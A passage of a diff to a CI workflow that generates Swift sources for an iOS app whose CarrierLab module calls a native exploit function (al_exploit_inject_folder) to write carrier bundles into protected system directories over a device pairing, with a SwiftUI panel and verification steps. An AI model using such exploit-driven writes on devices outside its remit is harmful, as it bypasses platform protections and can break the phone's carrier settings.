+                      return (false, "Pairing file is not a plist (\(size) bytes).")
                   }
-                  guard let obj = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil),
-                        let dict = obj as? [String: Any] else {
-                      return (false, "Pairing file not a plist (\(size) bytes).")
+                  if !kind.hasLockdown {
+                      return (false, "Pairing file has the RPPairing half but no classic lockdown record "
+                          + "(HostCertificate / HostPrivateKey / DeviceCertificate). Airlift's Lockdown "
+                          + "fallback on port 62078 will fail with \"missing field DeviceCertificate\". "
+                          + "Open Tools / Airlift, delete the pairing file and pair again so the lockdown "
+                          + "record is issued.")
                   }
-                  if dict.isEmpty { return (false, "Pairing plist empty.") }
-                  return (true, "Pairing ok (\(size) bytes, \(dict.count) keys)")
+                  return (true, "Pairing ok (\(size) bytes)")
               }
 
               func probe() -> ProbeResult {
@@ -287,19 +1905,56 @@ jobs:
                   return ProbeResult(state: .ok, detail: msg)
               }
 
-              func injectFolder(sourceFolder: String, targetFolder: String, folderName: String) -> ProbeResult {
-                  let pre = probe()
-                  guard pre.ok else { return pre }
-                  guard let pairingPath = findPairingFile() else {
+              struct TreeSummary {
+                  let files: Int
+                  let bytes: Int
+                  let names: [String]
+                  var isEmpty: Bool { files == 0 }
+              }
+
+              func localTreeSummary(_ path: String) -> TreeSummary {
+                  let fm = FileManager.default
+                  var isDir: ObjCBool = false
+                  guard fm.fileExists(atPath: path, isDirectory: &isDir), isDir.boolValue else {
+                      return TreeSummary(files: 0, bytes: 0, names: [])
+                  }
+                  var files = 0
+                  var bytes = 0
+                  var names: [String] = []
+                  let root = URL(fileURLWithPath: path)
+                  guard let walker = fm.enumerator(at: root, includingPropertiesForKeys: [.fileSizeKey, .isRegularFileKey]) else {
+                      return TreeSummary(files: 0, bytes: 0, names: [])
+                  }
+                  for case let url as URL in walker {
+                      let values = try? url.resourceValues(forKeys: [.fileSizeKey, .isRegularFileKey])
+                      guard values?.isRegularFile == true else { continue }
+                      files += 1
+                      bytes += values?.fileSize ?? 0
+                      if names.count < 12 {
+                          names.append(url.path.replacingOccurrences(of: path + "/", with: ""))
+                      }
+                  }
+                  return TreeSummary(files: files, bytes: bytes, names: names)
+              }
+
+              func injectFolder(sourceFolder: String,
+                                targetParent: String,
+                                destName: String) -> ProbeResult {
+                  guard let pairing = findPairingFile() else {
                       return ProbeResult(state: .noPairing, detail: "no pairing path")
+                  }
+                  let summary = localTreeSummary(sourceFolder)
+                  if summary.isEmpty {
+                      return ProbeResult(state: .ffiFailed("no files in directory: \(sourceFolder) is empty or is not a directory"),
+                                         detail: "no files in directory")
                   }
                   var outError: UnsafeMutablePointer<CChar>? = nil
                   var rc: Int32 = -1
-                  pairingPath.withCString { pc in
+                  pairing.withCString { pc in
                       sourceFolder.withCString { sc in
-                          targetFolder.withCString { tc in
-                              folderName.withCString { nc in
-                                  rc = al_exploit_inject_folder(pc, sc, tc, nc, nil, nil, &outError)
+                          targetParent.withCString { tc in
+                              destName.withCString { nc in
+                                  rc = al_exploit_inject_folder(pc, sc, tc, nc, injectLogCallback, nil, &outError)
                               }
                           }
                       }
@@ -309,38 +1964,16 @@ jobs:
                   if rc != 0 {
                       return ProbeResult(state: .ffiFailed(errMsg.isEmpty ? "inject rc=\(rc)" : errMsg), detail: errMsg)
                   }
-                  return ProbeResult(state: .ok, detail: "injected")
-              }
-
-              func writeFile(source: String, target: String) -> ProbeResult {
-                  let pre = probe()
-                  guard pre.ok else { return pre }
-                  guard let pairingPath = findPairingFile() else {
-                      return ProbeResult(state: .noPairing, detail: "no pairing path")
-                  }
-                  var outJson: UnsafeMutablePointer<CChar>? = nil
-                  var outErr: UnsafeMutablePointer<CChar>? = nil
-                  var rc: Int32 = -1
-                  pairingPath.withCString { pc in
-                      source.withCString { sc in
-                          target.withCString { tc in
-                              rc = al_exploit_run(pc, tc, nil, nil, &outJson, &outErr)
-                          }
-                      }
-                  }
-                  let errMsg = outErr.flatMap { String(cString: $0) } ?? ""
-                  if let p = outJson { al_string_free(p) }
-                  if let p = outErr { al_string_free(p) }
-                  if rc != 0 { return ProbeResult(state: .ffiFailed(errMsg.isEmpty ? "rc=\(rc)" : errMsg), detail: errMsg) }
-                  return ProbeResult(state: .ok, detail: "ok")
+                  return ProbeResult(state: .ok, detail: "injected \(summary.files) file(s)")
               }
           }
-          BRIDGE_EOF
+          CLBRIDGE_EOF
+
       - name: Write CarrierLabInstaller
         run: |
           set -euo pipefail
           mkdir -p natsuk1/CarrierLab
-          cat > natsuk1/CarrierLab/CarrierLabInstaller.swift <<'INSTALLER_EOF'
+          cat > natsuk1/CarrierLab/CarrierLabInstaller.swift <<'CLINSTALLER_EOF'
           import Foundation
 
           final class CarrierLabInstaller: @unchecked Sendable {
@@ -351,11 +1984,20 @@ jobs:
 
               struct CheckResult {
                   let probe: CarrierLabBridge.ProbeResult
+                  let carrierUserRootExists: Bool
                   let carrierRootExists: Bool
-                  let bundleLinksExists: Bool
                   let resourcesBundled: Bool
+                  let sourceFiles: Int
+                  let sourceBytes: Int
                   let backupPresent: Bool
                   let status: CarrierLabState.Status
+              }
+
+              struct InstallResult {
+                  let ok: Bool
+                  let message: String
+                  let slotsWritten: [String]
+                  let failures: [String]
               }
 
               func carrierBundleURL() -> URL {
@@ -369,77 +2011,156 @@ jobs:
               func check() -> CheckResult {
                   let fm = FileManager.default
                   let probe = bridge.probe()
+                  let tree = bridge.localTreeSummary(carrierBundleURL().path)
                   return CheckResult(
                       probe: probe,
-                      carrierRootExists: fm.fileExists(atPath: bridge.carrierRootPath()),
-                      bundleLinksExists: fm.fileExists(atPath: bridge.bundleLinksPath()),
-                      resourcesBundled: fm.fileExists(atPath: carrierBundleURL().path),
+                      carrierUserRootExists: fm.fileExists(atPath: CarrierLabBridge.carrierUserRoot),
+                      carrierRootExists: fm.fileExists(atPath: CarrierLabBridge.carrierRoot),
+                      resourcesBundled: fm.fileExists(atPath: carrierBundleURL().path)
+                          && fm.fileExists(atPath: docomoBundleURL().path),
+                      sourceFiles: tree.files,
+                      sourceBytes: tree.bytes,
                       backupPresent: state.hasBackup(),
-                      status: state.session?.status ?? .clean
-                  )
+                      status: state.session?.status ?? .clean)
               }
 
-              func install() -> CarrierLabBridge.ProbeResult {
+              func diagnose() -> [String] {
+                  let fm = FileManager.default
+                  var lines: [String] = []
+                  let pairing = bridge.findPairingFile()
+                  lines.append("[diagnose] pairing=\(pairing ?? "none")")
+                  if let p = pairing {
+                      let size = (try? fm.attributesOfItem(atPath: p)[.size] as? Int) ?? 0
+                      let kind = PairingFileKind.of(path: p)
+                      lines.append("[diagnose] bytes=\(size) rpPairing=\(kind.hasRemotePairing) "
+                          + "lockdown=\(kind.hasLockdown) udid=\(kind.udid ?? "-")")
+                  }
+                  lines.append("[diagnose] vpn=\(NetworkStatus.loopbackVPNUp()) peer=\(NetworkStatus.tunnelIP() ?? "-") "
+                      + "local=\(NetworkStatus.deviceIP() ?? "-")")
+                  lines.append("[diagnose] userRoot=\(CarrierLabBridge.carrierUserRoot) "
+                      + "exists=\(fm.fileExists(atPath: CarrierLabBridge.carrierUserRoot))")
+                  lines.append("[diagnose] iphoneRoot=\(CarrierLabBridge.carrierRoot) "
+                      + "exists=\(fm.fileExists(atPath: CarrierLabBridge.carrierRoot))")
+                  lines.append("[diagnose] slots=\(state.slots.joined(separator: ","))")
+                  let src = carrierBundleURL().path
+                  let tree = bridge.localTreeSummary(src)
+                  lines.append("[diagnose] source=\(src) files=\(tree.files) bytes=\(tree.bytes)")
+                  for n in tree.names { lines.append("[diagnose]   \(n)") }
+                  let doc = docomoBundleURL().path
+                  let docTree = bridge.localTreeSummary(doc)
+                  lines.append("[diagnose] trigger=\(doc) files=\(docTree.files) bytes=\(docTree.bytes)")
+                  return lines
+              }
+
+              private func preflight(_ source: String) -> String? {
+                  let summary = bridge.localTreeSummary(source)
+                  if summary.isEmpty {
+                      return "no files in directory: \(source) is empty or is not a directory"
+                  }
+                  return nil
+              }
+
+              func install() -> InstallResult {
+                  let fm = FileManager.default
                   let carrierBundle = carrierBundleURL()
                   let docomoBundle = docomoBundleURL()
-                  guard FileManager.default.fileExists(atPath: carrierBundle.path) else {
-                      return CarrierLabBridge.ProbeResult(state: .ffiFailed("CarrierLab.bundle missing"), detail: "missing")
+                  guard fm.fileExists(atPath: carrierBundle.path) else {
+                      return InstallResult(ok: false, message: "CarrierLab.bundle missing", slotsWritten: [], failures: [])
                   }
-                  guard FileManager.default.fileExists(atPath: docomoBundle.path) else {
-                      return CarrierLabBridge.ProbeResult(state: .ffiFailed("Docomo_jp.bundle missing"), detail: "missing")
+                  guard fm.fileExists(atPath: docomoBundle.path) else {
+                      return InstallResult(ok: false, message: "Docomo_jp.bundle missing", slotsWritten: [], failures: [])
                   }
                   let pre = bridge.probe()
-                  guard pre.ok else { return pre }
+                  guard pre.ok else {
+                      return InstallResult(ok: false, message: pre.message, slotsWritten: [], failures: [])
+                  }
+                  if let problem = preflight(carrierBundle.path) {
+                      return InstallResult(ok: false, message: problem, slotsWritten: [], failures: [problem])
+                  }
 
-                  let s = CarrierLabState.Session(
+                  let slots = state.slots
+                  state.save(CarrierLabState.Session(
                       status: .placing,
                       startedAt: Date(),
                       carrierBundlePath: carrierBundle.path,
                       originalBackupPath: state.backupURL().path,
                       ipccTriggerPath: docomoBundle.path,
                       lastError: nil,
-                      aliases: nil)
-                  state.save(s)
+                      aliases: nil,
+                      slots: slots))
 
-                  let r1 = bridge.injectFolder(
-                      sourceFolder: carrierBundle.path,
-                      targetFolder: bridge.bundleLinksPath(),
-                      folderName: "CarrierLab.bundle")
-                  if !r1.ok {
-                      var bad = s
-                      bad.status = .failed
-                      bad.lastError = r1.message
-                      state.save(bad)
-                      return r1
+                  var written: [String] = []
+                  var failures: [String] = []
+
+                  for slot in slots {
+                      let r = bridge.injectFolder(sourceFolder: carrierBundle.path,
+                                                  targetParent: CarrierLabBridge.carrierUserRoot,
+                                                  destName: slot)
+                      if r.ok {
+                          written.append(slot)
+                          state.appendLog("[install] slot \(slot) ok")
+                      } else {
+                          failures.append("\(slot): \(r.message)")
+                          state.appendLog("[install] slot \(slot) failed: \(r.message)")
+                      }
                   }
 
-                  let r2 = bridge.injectFolder(
-                      sourceFolder: docomoBundle.path,
-                      targetFolder: bridge.carrierRootPath(),
-                      folderName: "Docomo_jp.bundle")
-                  if !r2.ok {
-                      var bad = s
-                      bad.status = .failed
-                      bad.lastError = r2.message
-                      state.save(bad)
-                      return r2
+                  if !failures.isEmpty {
+                      state.save(CarrierLabState.Session(
+                          status: .failed,
+                          startedAt: Date(),
+                          carrierBundlePath: carrierBundle.path,
+                          originalBackupPath: state.backupURL().path,
+                          ipccTriggerPath: docomoBundle.path,
+                          lastError: failures.joined(separator: " | "),
+                          aliases: nil,
+                          slots: written))
+                      return InstallResult(ok: false,
+                                           message: failures.joined(separator: " | "),
+                                           slotsWritten: written,
+                                           failures: failures)
                   }
 
-                  var done = s
-                  done.status = .placed
-                  state.save(done)
-                  return CarrierLabBridge.ProbeResult(state: .ok, detail: "installed")
+                  let trigger = bridge.injectFolder(sourceFolder: docomoBundle.path,
+                                                    targetParent: CarrierLabBridge.carrierRoot,
+                                                    destName: "Docomo_jp.bundle")
+                  if !trigger.ok {
+                      state.save(CarrierLabState.Session(
+                          status: .failed,
+                          startedAt: Date(),
+                          carrierBundlePath: carrierBundle.path,
+                          originalBackupPath: state.backupURL().path,
+                          ipccTriggerPath: docomoBundle.path,
+                          lastError: trigger.message,
+                          aliases: nil,
+                          slots: written))
+                      return InstallResult(ok: false, message: trigger.message, slotsWritten: written, failures: [trigger.message])
+                  }
+
+                  state.save(CarrierLabState.Session(
+                      status: .placed,
+                      startedAt: Date(),
+                      carrierBundlePath: carrierBundle.path,
+                      originalBackupPath: state.backupURL().path,
+                      ipccTriggerPath: docomoBundle.path,
+                      lastError: nil,
+                      aliases: nil,
+                      slots: written))
+                  state.appendLog("[install] placed into \(written.joined(separator: ","))")
+                  return InstallResult(ok: true, message: "installed", slotsWritten: written, failures: [])
               }
 
-              func reload() -> CarrierLabBridge.ProbeResult {
+              func reload() -> InstallResult {
                   guard let s = state.session, s.status == .placed || s.status == .finished else {
-                      return CarrierLabBridge.ProbeResult(state: .ffiFailed("Nothing to reload. Install first."), detail: "no session")
+                      return InstallResult(ok: false, message: "Nothing to reload. Install first.",
+                                           slotsWritten: [], failures: [])
                   }
-                  _ = s
-                  return bridge.injectFolder(
-                      sourceFolder: docomoBundleURL().path,
-                      targetFolder: bridge.carrierRootPath(),
-                      folderName: "Docomo_jp.bundle")
+                  let trigger = bridge.injectFolder(sourceFolder: docomoBundleURL().path,
+                                                    targetParent: CarrierLabBridge.carrierRoot,
+                                                    destName: "Docomo_jp.bundle")
+                  state.appendLog(trigger.ok ? "[reload] trigger ok" : "[reload] trigger failed: \(trigger.message)")
+                  return InstallResult(ok: trigger.ok, message: trigger.message,
+                                       slotsWritten: s.slots ?? [], failures: trigger.ok ? [] : [trigger.message])
               }
 
               func finish() {
@@ -453,7 +2174,412 @@ jobs:
                   state.clear()
               }
           }
-          INSTALLER_EOF
+          CLINSTALLER_EOF
+
+      - name: Write CarrierLabState
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/CarrierLab
+          cat > natsuk1/CarrierLab/CarrierLabState.swift <<'CLSTATE_EOF'
+          import Foundation
+          import Combine
+
+          final class CarrierLabState: ObservableObject, @unchecked Sendable {
+              static let shared = CarrierLabState()
+
+              enum Status: String, Codable { case clean, placing, placed, finished, failed }
+
+              struct Session: Codable {
+                  var status: Status
+                  var startedAt: Date
+                  var carrierBundlePath: String?
+                  var originalBackupPath: String?
+                  var ipccTriggerPath: String?
+                  var lastError: String?
+                  var aliases: [String]?
+                  var slots: [String]?
+              }
+
+              @Published private(set) var session: Session?
+              @Published private(set) var airliftOK: Bool = false
+              @Published private(set) var airliftMessage: String = "Checking..."
+              @Published private(set) var resourcesOK: Bool = false
+              @Published private(set) var busy: Bool = false
+              @Published private(set) var logText: String = ""
+              @Published private(set) var slots: [String] = CarrierLabBridge.defaultSlots
+
+              private let root: URL
+              private let stateURL: URL
+              private let backupDir: URL
+              private let slotsKey = "natsuk1_carrierlab_slots"
+
+              private init() {
+                  let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
+                      ?? URL(fileURLWithPath: NSTemporaryDirectory())
+                  root = docs.appendingPathComponent("carrierlab", isDirectory: true)
+                  stateURL = root.appendingPathComponent("state.json")
+                  backupDir = root.appendingPathComponent("backup", isDirectory: true)
+                  try? FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
+                  if let stored = UserDefaults.standard.array(forKey: slotsKey) as? [String], !stored.isEmpty {
+                      slots = stored
+                  }
+                  load()
+              }
+
+              func load() {
+                  guard let data = try? Data(contentsOf: stateURL),
+                        let s = try? JSONDecoder().decode(Session.self, from: data) else {
+                      DispatchQueue.main.async { self.session = nil }
+                      return
+                  }
+                  DispatchQueue.main.async { self.session = s }
+              }
+
+              func save(_ s: Session) {
+                  DispatchQueue.main.async {
+                      self.session = s
+                      let enc = JSONEncoder()
+                      enc.outputFormatting = [.prettyPrinted, .sortedKeys]
+                      enc.dateEncodingStrategy = .iso8601
+                      if let d = try? enc.encode(s) {
+                          try? d.write(to: self.stateURL, options: .atomic)
+                      }
+                  }
+              }
+
+              func clear() {
+                  DispatchQueue.main.async {
+                      self.session = nil
+                      try? FileManager.default.removeItem(at: self.stateURL)
+                  }
+              }
+
+              func hasBackup() -> Bool {
+                  guard let s = session, let p = s.originalBackupPath else { return false }
+                  return FileManager.default.fileExists(atPath: p)
+              }
+
+              func setAirlift(ok: Bool, message: String) {
+                  DispatchQueue.main.async {
+                      self.airliftOK = ok
+                      self.airliftMessage = message
+                  }
+              }
+
+              func setResources(_ ok: Bool) {
+                  DispatchQueue.main.async { self.resourcesOK = ok }
+              }
+
+              func setBusy(_ v: Bool) {
+                  DispatchQueue.main.async { self.busy = v }
+              }
+
+              func setSlots(_ v: [String]) {
+                  let cleaned = v.map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
+                      .filter { !$0.isEmpty }
+                  let unique = cleaned.reduce(into: [String]()) { acc, s in if !acc.contains(s) { acc.append(s) } }
+                  DispatchQueue.main.async {
+                      self.slots = unique.isEmpty ? CarrierLabBridge.defaultSlots : unique
+                      UserDefaults.standard.set(self.slots, forKey: self.slotsKey)
+                  }
+              }
+
+              func appendLog(_ s: String) {
+                  DispatchQueue.main.async {
+                      self.logText += s + "\n"
+                      if self.logText.count > 20000 { self.logText = String(self.logText.suffix(15000)) }
+                  }
+              }
+
+              func clearLog() {
+                  DispatchQueue.main.async { self.logText = "" }
+              }
+
+              func backupURL() -> URL { backupDir }
+          }
+          CLSTATE_EOF
+
+      - name: Write CarrierLabView
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/CarrierLab
+          cat > natsuk1/CarrierLab/CarrierLabView.swift <<'CLVIEW_EOF'
+          import SwiftUI
+
+          struct CarrierLabView: View {
+              @ObservedObject private var clState = CarrierLabState.shared
+              @EnvironmentObject private var appState: AppState
+
+              @State private var slotText: String = ""
+              @State private var sourceInfo: String = ""
+
+              private let ticker = Timer.publish(every: 5.0, on: .main, in: .common).autoconnect()
+
+              var body: some View {
+                  List {
+                      airliftSection
+                      pairingHintSection
+                      resourcesSection
+                      targetsSection
+                      statusSection
+                      actionsSection
+                      logSection
+                  }
+                  .listStyle(.insetGrouped)
+                  .navigationTitle("CarrierLab")
+                  .navigationBarTitleDisplayMode(.inline)
+                  .onAppear {
+                      slotText = clState.slots.joined(separator: ", ")
+                      runCheck()
+                  }
+                  .onReceive(ticker) { _ in
+                      if !clState.busy { runCheck(silent: true) }
+                  }
+              }
+
+              private var airliftSection: some View {
+                  Section {
+                      HStack(spacing: 12) {
+                          Image(systemName: clState.airliftOK ? "checkmark.circle.fill" : "exclamationmark.circle.fill")
+                              .font(.system(size: 22))
+                              .foregroundStyle(clState.airliftOK ? .green : .orange)
+                          VStack(alignment: .leading, spacing: 3) {
+                              Text("Airlift")
+                              Text(clState.airliftOK ? "Connected" : "Not ready")
+                                  .font(.subheadline)
+                                  .foregroundStyle(clState.airliftOK ? .green : .orange)
+                              if !clState.airliftOK {
+                                  Text(clState.airliftMessage)
+                                      .font(.footnote)
+                                      .foregroundStyle(.secondary)
+                                      .lineLimit(6)
+                              }
+                          }
+                          Spacer()
+                      }
+                      .padding(.vertical, 4)
+                  } header: { Label("Airlift", systemImage: "antenna.radiowaves.left.and.right") }
+              }
+
+              @ViewBuilder
+              private var pairingHintSection: some View {
+                  if !clState.airliftOK {
+                      Section {
+                          VStack(alignment: .leading, spacing: 6) {
+                              Label("Pairing is done in Airlift only", systemImage: "info.circle")
+                                  .font(.footnote)
+                                  .foregroundStyle(.secondary)
+                              Text("CarrierLab never creates a pairing file. Open Tools / Airlift, run Start Pairing, then return here.")
+                                  .font(.caption)
+                                  .foregroundStyle(.secondary)
+                              Text("The file must contain the classic lockdown record. If Install stays blocked, tap Delete Pairing in Airlift, then Start Pairing again and approve both the PIN and the Trust prompt.")
+                                  .font(.caption2)
+                                  .foregroundStyle(.orange)
+                          }
+                      }
+                  }
+              }
+
+              private var resourcesSection: some View {
+                  Section {
+                      HStack {
+                          Text("CarrierAssets")
+                          Spacer()
+                          Text(clState.resourcesOK ? "Bundled" : "Missing")
+                              .foregroundStyle(clState.resourcesOK ? .green : .red)
+                      }
+                      if !sourceInfo.isEmpty {
+                          Text(sourceInfo)
+                              .font(.system(size: 10, design: .monospaced))
+                              .foregroundStyle(.secondary)
+                      }
+                  } header: { Label("Resources", systemImage: "shippingbox") }
+              }
+
+              private var targetsSection: some View {
+                  Section {
+                      HStack {
+                          Text("Slots")
+                          Spacer()
+                          TextField("Carrier1Bundle.bundle, ...", text: $slotText)
+                              .multilineTextAlignment(.trailing)
+                              .font(.system(.footnote, design: .monospaced))
+                              .autocorrectionDisabled()
+                              .onSubmit { applySlots() }
+                      }
+                      Button { applySlots() } label: { Text("Apply Slots") }
+                          .disabled(clState.busy)
+                      Button { slotText = CarrierLabBridge.defaultSlots.joined(separator: ", "); applySlots() } label: {
+                          Text("Reset Slots To Default")
+                      }
+                      .disabled(clState.busy)
+                  } header: { Label("Targets", systemImage: "folder.badge.gearshape") }
+                  footer: {
+                      Text("Contents of CarrierLab.bundle are written into these existing bundles under \(CarrierLabBridge.carrierUserRoot). The app cannot list that directory, so the names must match what is on the device.")
+                          .font(.caption2)
+                  }
+              }
+
+              private var statusSection: some View {
+                  Section {
+                      HStack {
+                          Text("Status")
+                          Spacer()
+                          Text(statusText)
+                              .font(.system(.body, design: .monospaced))
+                              .foregroundStyle(statusColor)
+                      }
+                      if let s = clState.session {
+                          HStack {
+                              Text("Started")
+                              Spacer()
+                              Text(s.startedAt.formatted())
+                                  .font(.system(.body, design: .monospaced))
+                                  .foregroundStyle(.secondary)
+                          }
+                          if let slots = s.slots, !slots.isEmpty {
+                              HStack {
+                                  Text("Written")
+                                  Spacer()
+                                  Text(slots.joined(separator: ","))
+                                      .font(.system(.footnote, design: .monospaced))
+                                      .foregroundStyle(.secondary)
+                              }
+                          }
+                          if let e = s.lastError {
+                              Text(e)
+                                  .font(.footnote)
+                                  .foregroundStyle(.red)
+                          }
+                      }
+                  } header: { Label("CarrierLab", systemImage: "shippingbox") }
+              }
+
+              private var actionsSection: some View {
+                  Section {
+                      Button { runCheck() } label: { Text("Check") }
+                          .disabled(clState.busy)
+                      Button { runDiagnose() } label: { Text("Diagnose") }
+                          .disabled(clState.busy)
+                      Button { runInstall() } label: { Text("Install") }
+                          .disabled(clState.busy || !clState.airliftOK || !clState.resourcesOK)
+                      Button { runReload() } label: { Text("Reload") }
+                          .disabled(clState.busy || !clState.airliftOK || !clState.resourcesOK)
+                      Button { runFinish() } label: { Text("Finish") }
+                          .disabled(clState.busy)
+                      Button { appState.respring() } label: { Text("Respring") }
+                          .disabled(clState.busy)
+                      Button(role: .destructive) { runReset() } label: { Text("Reset") }
+                          .disabled(clState.busy)
+                  } header: { Label("Actions", systemImage: "wrench") }
+              }
+
+              @ViewBuilder
+              private var logSection: some View {
+                  if !clState.logText.isEmpty {
+                      Section {
+                          ScrollView {
+                              Text(clState.logText)
+                                  .font(.system(size: 10, design: .monospaced))
+                                  .frame(maxWidth: .infinity, alignment: .leading)
+                          }
+                          .frame(minHeight: 120, maxHeight: 300)
+                      } header: { Label("Log", systemImage: "terminal") }
+                  }
+              }
+
+              private var statusText: String {
+                  clState.session?.status.rawValue ?? "clean"
+              }
+
+              private var statusColor: Color {
+                  switch clState.session?.status {
+                  case .placed, .finished: return .green
+                  case .placing: return .orange
+                  case .failed: return .red
+                  default: return .secondary
+                  }
+              }
+
+              private func applySlots() {
+                  let parsed = slotText.split(separator: ",").map { String($0).trimmingCharacters(in: .whitespaces) }
+                  clState.setSlots(parsed)
+                  clState.appendLog("[slots] \(clState.slots.joined(separator: ","))")
+              }
+
+              private func runCheck(silent: Bool = false) {
+                  if clState.busy { return }
+                  clState.setBusy(true)
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      let r = CarrierLabInstaller.shared.check()
+                      CarrierLabState.shared.setAirlift(ok: r.probe.ok, message: r.probe.message)
+                      CarrierLabState.shared.setResources(r.resourcesBundled)
+                      let info = "source \(r.sourceFiles) file(s), \(r.sourceBytes) bytes · userRoot=\(r.carrierUserRootExists) · iphoneRoot=\(r.carrierRootExists)"
+                      DispatchQueue.main.async { sourceInfo = info }
+                      if !silent {
+                          CarrierLabState.shared.appendLog("[check] airlift=\(r.probe.ok) msg=\(r.probe.message)")
+                          CarrierLabState.shared.appendLog("[check] \(info)")
+                      }
+                      CarrierLabState.shared.setBusy(false)
+                  }
+              }
+
+              private func runDiagnose() {
+                  if clState.busy { return }
+                  clState.setBusy(true)
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      for line in CarrierLabInstaller.shared.diagnose() {
+                          CarrierLabState.shared.appendLog(line)
+                      }
+                      CarrierLabState.shared.setBusy(false)
+                  }
+              }
+
+              private func runInstall() {
+                  if clState.busy { return }
+                  clState.setBusy(true)
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      let r = CarrierLabInstaller.shared.install()
+                      CarrierLabState.shared.appendLog(r.ok
+                          ? "[install] ok slots=\(r.slotsWritten.joined(separator: ","))"
+                          : "[install] failed: \(r.message)")
+                      CarrierLabState.shared.setBusy(false)
+                  }
+              }
+
+              private func runReload() {
+                  if clState.busy { return }
+                  clState.setBusy(true)
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      let r = CarrierLabInstaller.shared.reload()
+                      CarrierLabState.shared.appendLog(r.ok ? "[reload] ok" : "[reload] failed: \(r.message)")
+                      CarrierLabState.shared.setBusy(false)
+                  }
+              }
+
+              private func runFinish() {
+                  if clState.busy { return }
+                  clState.setBusy(true)
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      CarrierLabInstaller.shared.finish()
+                      CarrierLabState.shared.appendLog("[finish] ok")
+                      CarrierLabState.shared.setBusy(false)
+                  }
+              }
+
+              private func runReset() {
+                  if clState.busy { return }
+                  clState.setBusy(true)
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      CarrierLabInstaller.shared.reset()
+                      CarrierLabState.shared.clearLog()
+                      CarrierLabState.shared.appendLog("[reset] ok")
+                      CarrierLabState.shared.setBusy(false)
+                  }
+              }
+          }
+          CLVIEW_EOF
+
       - name: Commit
         run: |
           set -euo pipefail
@@ -463,25 +2589,75 @@ jobs:
           if git diff --cached --quiet; then
             echo "no changes"
           else
-            git commit -m "fix: pass-through pairing, inject_folder, no lockdown gate [skip ci]"
+            git commit -m "fix: carrier slot injection, respring hardening, state-thread fixes [skip ci]"
             git push
           fi
 
-      - name: Generate project
+      - name: Verify sources
         run: |
           set -euo pipefail
           test -d natsuk1/Resources/CarrierAssets/CarrierLab.bundle
           test -f natsuk1/Resources/CarrierAssets/CarrierLab.bundle/carrier.plist
           test -f natsuk1/Resources/CarrierAssets/Docomo_jp.bundle/carrier.plist
-          grep -q 'CarrierAssets' project.yml
+          test -f natsuk1/Support/bridging.h
+          test -f natsuk1/Support/idevice_shim.h
+          test -f natsuk1/Helpers/PairingGenerator.swift
+          test -f natsuk1/Helpers/CompositePairingFile.swift
+          test -f natsuk1/Helpers/LockdownPair.swift
+          test -f natsuk1/Helpers/Respring.swift
+          test -f natsuk1/App/natsuk1.swift
+          test -f natsuk1/Views/AirliftView.swift
+          test -f natsuk1/CarrierLab/CarrierLabView.swift
+          grep -q 'idevice_shim.h' natsuk1/Support/bridging.h
+          grep -q 'lockdownd_pair' natsuk1/Support/idevice_shim.h
+          grep -q 'lockdownd_pair' natsuk1/Helpers/LockdownPair.swift
+          grep -q 'idevice_pairing_file_serialize' natsuk1/Helpers/LockdownPair.swift
+          grep -q 'LockdownPair.mintRecord' natsuk1/Helpers/PairingGenerator.swift
+          grep -q 'CompositePairingFile.merge' natsuk1/Helpers/PairingGenerator.swift
+          grep -q 'hasLockdown' natsuk1/Helpers/AirliftBridge.swift
+          grep -q 'pairingFileExists' natsuk1/Helpers/AirliftBridge.swift
+          grep -q 'pairingFileExists' natsuk1/Views/AirliftView.swift
+          grep -q 'hasLockdown' natsuk1/CarrierLab/CarrierLabBridge.swift
+          grep -q 'no files in directory' natsuk1/CarrierLab/CarrierLabBridge.swift
+          grep -q 'defaultSlots' natsuk1/CarrierLab/CarrierLabBridge.swift
+          grep -q 'CarrierLabBridge.defaultSlots' natsuk1/CarrierLab/CarrierLabState.swift
+          grep -q 'bridge.injectFolder' natsuk1/CarrierLab/CarrierLabInstaller.swift
+          grep -q 'carrierUserRoot' natsuk1/CarrierLab/CarrierLabInstaller.swift
+          grep -q 'DispatchQueue.global' natsuk1/App/natsuk1.swift
+          grep -q 'loadHTMLString' natsuk1/Helpers/Respring.swift
+          grep -q 'backdrop-filter' natsuk1/Helpers/Respring.swift
+          grep -q 'sdk: Network.framework' project.yml
+          grep -q 'sdk: WebKit.framework' project.yml
           grep -q 'lc++' project.yml
+          grep -q 'libairlift_ffi.a' project.yml
+          grep -q 'SRCROOT)/natsuk1/Support' project.yml
+          grep -q 'SRCROOT)/natsuk1/Exploit/Airlift' project.yml
           grep -q 'natsuk1/Support/bridging.h' project.yml
-          grep -q 'al_exploit_inject_folder' natsuk1/CarrierLab/CarrierLabBridge.swift
-          grep -q 'injectFolder' natsuk1/CarrierLab/CarrierLabInstaller.swift
-          ! grep -q '_silgen_name' natsuk1/CarrierLab/CarrierLabBridge.swift
-          ! grep -q '_silgen_name' natsuk1/CarrierLab/CarrierLabInstaller.swift
-          ! grep -q 'lockdownd' natsuk1/Helpers/PairingGenerator.swift
-          grep -q 'syncCanonicalPairingFile' natsuk1/Helpers/PairingGenerator.swift
+          grep -q 'natsuk1/CarrierLab' project.yml
+          ! grep -q 'show_respring' natsuk1/App/natsuk1.swift
+          ! grep -q 'al_device_respring' natsuk1/Helpers/AirliftBridge.swift
+          ! grep -q 'al_find_app_container' natsuk1/Helpers/AirliftBridge.swift
+          ! grep -q 'func findContainer' natsuk1/Helpers/AirliftBridge.swift
+          ! grep -q 'func writeFile' natsuk1/CarrierLab/CarrierLabBridge.swift
+          ! grep -q 'func rootURL' natsuk1/CarrierLab/CarrierLabState.swift
+          ! grep -q 'func interfaces' natsuk1/Helpers/NetworkStatus.swift
+          ! grep -q 'Task' natsuk1/App/natsuk1.swift
+          ! grep -q 'Task' natsuk1/Helpers/AirliftBridge.swift
+          ! grep -q 'lockdownd_pair_record_free' natsuk1/Helpers/LockdownPair.swift
+          ! grep -q '_silgen_name' natsuk1/Helpers/LockdownPair.swift
+
+      - name: Validate project.yml
+        run: |
+          set -euo pipefail
